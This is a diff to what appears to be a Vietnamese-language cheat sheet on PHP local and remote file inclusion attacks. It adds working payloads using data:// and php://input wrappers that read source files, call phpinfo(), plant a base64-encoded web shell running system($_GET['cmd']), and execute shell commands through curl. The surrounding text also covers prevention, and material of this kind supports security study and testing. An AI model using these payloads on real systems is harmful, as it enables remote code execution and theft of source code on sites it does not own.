@@ -109,7 +109,21 @@ echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=da
 ```
 echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");
 ```
-
+## data://(chưa test)
+```
+http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
+http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
+```
+## PHP://input
+```
+curl -XPOST "http://localhost/LFI-RFI/Index.php?page=php://input" --data "<?php echo shell_exec('whoami'); ?>"
+```
+## ZIP / PHAR
 # note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
 ## How to Prevent LFI and RFI Attacks?
 - Input Validation
